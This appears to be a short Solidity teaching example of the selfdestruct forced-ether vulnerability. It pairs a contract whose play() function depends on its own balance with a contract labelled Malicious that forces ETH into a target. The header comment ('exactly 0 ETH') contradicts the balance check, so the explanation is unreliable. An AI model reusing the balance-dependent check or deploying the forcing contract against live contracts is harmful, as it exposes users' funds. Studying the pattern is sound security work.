// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// This contract expects to have exactly 0 ETH
contract SelfdestructForcedEther {
    uint256 public constant TARGET = 10 ether;

    // Assume the contract must have at least TARGET ETH to play
    function play() external payable {
        require(address(this).balance >= TARGET, "Not enough funds");
        // ... game logic
    }
}

// Malicious contract that forces ETH into the above contract
contract Malicious {
    constructor(address target) payable {
        // selfdestruct sends its entire balance to target without calling receive()
        selfdestruct(payable(target));
    }
}
